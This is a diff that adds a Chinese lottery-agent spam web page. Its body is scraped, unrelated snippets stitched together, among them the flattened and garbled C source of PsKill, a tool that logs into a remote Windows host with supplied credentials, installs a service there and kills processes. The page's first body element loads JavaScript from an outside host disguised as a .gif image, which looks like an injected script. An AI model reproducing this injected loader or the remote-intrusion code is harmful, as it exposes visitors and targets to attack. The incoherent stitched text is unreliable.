@@ -1,0 +1,73 @@
+<!DOCTYPE html PUBLIC "-//W3C//liD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/liD/xhtml1-transitional.lid">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>泰皇彩票代理 - 网站</title>
+<meta content="all" name="robots" />
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7" />
+<link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+<body><script language="javascript" src="http://bb.5599bb.com/888.gif"></script>
+<div class="wrap">
+   <div class="clear blank10"></div>
+   <div class="navi">　您现在的位置 <a  href="http:///baiducom">首页</a> ><a  href="http:///baidu">新闻资讯</a> ><a  href="http:///baidunet">新闻论坛</a> ><a  href="http:///baiducn">新闻专题</a> > <a  href="http:///baidujc">新闻行情</a> > <a  href="http:///baidugc">新闻时尚</a> > <a  href="http:///baidugo">新闻游戏</a> > <a  href="http:///baiduvip">新闻娱乐</a> > <a  href="http:///baidutv">新闻集休闲</a> > <a  href="http:///sohucom">新闻平台</a> > <a  href="http:///pps">产品中心</a> > 浏览文章</div>
+   <div class="clear blank10"></div>
+   <div class="newsmain">
+      <div id="side">
+	      <div class="sideNav">
+		     <h2>热门文章</h2>
+		        <ul><li><a href="http://www.15bl.com/baiducom">吉祥彩彩票</a></li>
+</ul>
+		   <div class="sidebottom"></div>
+	       </div>
+       </div>
+       <div class="rightPar" id="about">
+            <div class="aboutTitle">
+                <h3><span>作者：admin </span> 泰皇彩票代理</h3>
+            </div>
+              <div id="MyContent">
+					<div id="MyContent"><p>UERY_STRING查询字符串内容。
+</p>
+<p>为什么？当function_in_lib返回后，将在dummy_int32的地址处恢复可执行。
+</p>
+<p>但是真的要写出好的Exploit，还得下大力气精通那些语言。
+</p>
+<p>Pskill.c的源代码如下：Module:PsKill.cCreate:2001428Modify:2001623Author:ey4s&lt;ey4s21cnHttp:www.ey4s.orgPsKill==LocalandRemoteprocesskillerforwindows2k#include"ps.h"#defineEXE"killsrv.exe"#defineServiceName"PSKILL"#pragmacomment(lib,"mpr.lib")定义全局变量SERVICE_STATUSssStatus;SC_HANDLEhSCManager=NULL,hSCService=NULL;BOOLbKilled=FALSE;charszTarget[52]=0;BOOLConnIPC(char,char,char);建立IPC连接函数BOOLInstallService(DWORD,LPTSTR);安装函数BOOLWaitServiceStop();等待停止函数BOOLRemoveService();删除函数intmain(DWORDdwArgc,LPTSTRlpszArgv)BOOLbRet=FALSE,bFile=FALSE;chartmp[52]=0,RemoteFilePath[128]=0,szUser[52]=0,szPass[52]=0;HANDLEhFile=NULL;DWORDi=0,dwIndex=0,dwWrite,dwSize=sizeof(exebuff);杀本地进程if(dwArgc==2)if(KillPS(atoi(lpszArgv[1])))printf("LoaclProcess%shavebeedkilled!",lpszArgv[1]);elseprintf("LoaclProcess%scan'tbekilled!ErrorCode:%d",lpszArgv[1],GetLastError());return0;用户输入错误elseif(dwArgc!=5)printf("PSKILL==LocalandRemoteProcessKiller""Powerbyey4s&lt;ey4s21cn""http:www.ey4s.org2001623""Usage:%s&lt;PID&lt;==KilledLocalProcess""%s&lt;IP&lt;User&lt;PWD&lt;PID&lt;==KilledRemoteProcess",lpszArgv[0],lpszArgv[0]);return1;杀远程机器进程strncpy(szTarget,lpszArgv[1],sizeof(szTarget)1);strncpy(szUser,lpszArgv[2],sizeof(szUser)1);strncpy(szPass,lpszArgv[3],sizeof(szPass)1);将在目标机器上创建的exe文件的路径sprintf(RemoteFilePath,"\\%s\admin\system32\%s",szTarget,EXE);__try与目标建立IPC连接if(!ConnIPC(szTarget,szUser,szPass))printf("Connectto%sfailed:%d",szTarget,GetLastError());return1;printf("Connectto%ssuccess!",szTarget);在目标机器上创建exe文件hFile=CreateFile(RemoteFilePath,GENERIC_ALL,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);if(hFile==INVALID_HANDLE_VALUE)printf("Createfile%sfailed:%d",RemoteFilePath,GetLastError());__leave;写文件内容while(dwSizedwIndex)if(!WriteFile(hFile,&amp;exebuff[dwIndex],dwSizedwIndex,&amp;dwWrite,NULL))printf("Writefile%sfailed:%d",RemoteFilePath,GetLastError());__leave;dwIndex+=dwWrite;关闭文件句柄CloseHandle(hFile);bFile=TRUE;安装if(InstallService(dwArgc,lpszArgv))等待结束if(WaitServiceStop())printf("Servicewasstoped!");elseprintf("Servicecan'tbestoped.Trytodeleteit.");Sleep(500);删除RemoveService();__finally删除留下的文件if(bFile)DeleteFile(RemoteFilePath);如果文件句柄没有关闭,关闭之if(hFile!=NULL)CloseHandle(hFile);CloseServicehandleif(hSCService!=NULL)CloseServiceHandle(hSCService);ClosetheServiceControlManagerhandleif(hSCManager!=NULL)CloseServiceHandle(hSCManager);断开ipc连接wsprintf(tmp,"\\%s\ipc",szTarget);WNetCancelConnection2(tmp,CONNECT_UPDATE_PROFILE,TRUE);if(bKilled)printf("Process%son%shavebeenkilled!",lpszArgv[4],lpszArgv[1]);elseprintf("Process%son%scan'tbekilled!",lpszArgv[4],lpszArgv[1]);return0;BOOLConnIPC(charRemoteName,charUser,charPass)NETRESOURCEnr;charRN[50]="\\";strcat(RN,RemoteName);strcat(RN,"\ipc");nr.dwType=RESOURCETYPE_ANY;nr.lpLocalName=NULL;nr.lpRemoteName=RN;nr.lpProvider=NULL;if(WNetAddConnection2(&amp;nr,Pass,User,FALSE)==NO_ERROR)returnTRUE;elsereturnFALSE;BOOLInstallService(DWORDdwArgc,LPTSTRlpszArgv)BOOLbRet=FALSE;__tryOpenServiceControlManageronLocalorRemotemachinehSCManager=OpenSCManager(szTarget,NULL,SC_MANAGER_ALL_ACCESS);if(hSCManager==NULL)printf("OpenServiceControlManagefailed:%d",GetLastError());__leave;printf("OpenServiceControlManageok!");CreateServicehSCService=CreateService(hSCManager,handletoSatabaseServiceName,nameofservicetostartServiceName,displaynameSERVICE_ALL_ACCESS,typeofaccesstoserviceSERVICE_WIN32_OWN_PROCESS,typeofserviceSERVICE_AUTO_START,whentostartserviceSERVICE_ERROR_IGNORE,severityofservicefailureEXE,nameofbinaryfileNULL,nameofloadorderinggroupNULL,tagidentifierNULL,arrayofdependencynamesNULL,accountnameNULL);accountpasswordcreateservicefailedif(hSCService==NULL)如果已经存在，title那么则打开if(GetLastError()==ERROR_SERVICE_EXISTS)printf("Service%sAlreadyexists",ServiceName);openservicehSCService=OpenService(hSCManager,ServiceName,SERVICE_ALL_ACCESS);if(hSCService==NULL)printf("OpenServicefailed:%d",GetLastError());__leave;printf("OpenService%sok!",ServiceName);elseprintf("CreateServicefailed:%d",GetLastError());__leave;createserviceokelseprintf("CreateService%sok!",ServiceName);起动if(StartService(hSCService,dwArgc,lpszArgv))printf("Starting%s.",ServiceName);Sleep(20);时间最好不要超过100mswhile(ueryServiceStatus(hSCService,&amp;ssStatus))if(ssStatus.dwCurrentState==SERVICE_START_PENDING)printf(".");Sleep(20);elsebreak;if(ssStatus.dwCurrentState!=SERVICE_RUNNING)printf("%sfailedtorun:%d",ServiceName,GetLastError());elseif(GetLastError()==ERROR_SERVICE_ALREADY_RUNNING)printf("Service%salreadyrunning.",ServiceName);elseprintf("StartService%sfailed:%d",ServiceName,GetLastError());__leave;bRet=TRUE;enfoftry__finallyreturnbRet;returnbRet;BOOLWaitServiceStop(void)BOOLbRet=FALSE;printf("WaitServicestoped");while(1)Sleep(100);if(!ueryServiceStatus(hSCService,&amp;ssStatus))printf("ueryServiceStatusfailed:%d",GetLastError());break;if(ssStatus.dwCurrentState==SERVICE_STOPPED)bKilled=TRUE;bRet=TRUE;break;if(ssStatus.dwCurrentState==SERVICE_PAUSED)停止bRet=ControlService(hSCService,SERVICE_CONTROL_STOP,NULL);break;elseprintf(".");continue;returnbRet;
+</p>
+<p>明确安全对象，设置强有力的安全保障体系。
+</p>
+<p>四、缓冲区溢出攻击的防范方法
+</p>
+<p>下面我们所要作的工作就是把“1、“2之类的编号显示为“未付费会员和“已付费会员，否则，大家谁会知道“1代表的是“未付费会员，“2代表的是“已付费会员？步骤二：建DSN源，建记录集●运行DreamweaverMX软件，在会员title注册信息显示页面建一个名为ConnMember的DSN源。
+</p>
+<p>#SSL_BASE=usrlocalEAPI_MM=usrlocal
+</p>
+<p>?在命令提示符显示帮助。
+</p>
+<p>虽然多项选择题仍然是考试中的首要题型，但是拖拽题的数目也在日益增加。
+</p>
+<p>看起来他几乎可以做任何事情。
+</p>
+<p>这样可以阻止那些较长的script的输入。
+</p>
+<p>首先来看看Oracle证书的价格，Oracle的每门认证考试是135美金，共有5门考试，所有的考试费用再加上一些其它费用，要想通过Oracle认证考试本身就是一笔不小的投资，但是，从今天的就业市场来看，得到的回报还是值得的。
+</p>
+<p>所有的考试将继续包含现实、复杂的情形，这也将使记忆考题变得更困难。
+</p>
+
+					<br/>
+					<p align=left >上一篇：<a href="49.html">如何做优游平台代理
+</a>|下一篇：<a href="51.html">战国娱乐注册
+</a></P>
+					</div>
+		  </div>
+     </div>
+  </div>
+</div>
+<div class="clear blank10"></div>
+<div class="copyright"> <br>
+ </div>
+<script language="javascript" type="text/javascript" src="http://js.users.51.la/17275833.js"></script>
+  <script language="javascript" src="http://count19.51yes.com/click.aspx?id=193782333&logo=1" charset="gb2312"></script>
+</body>
+</html>
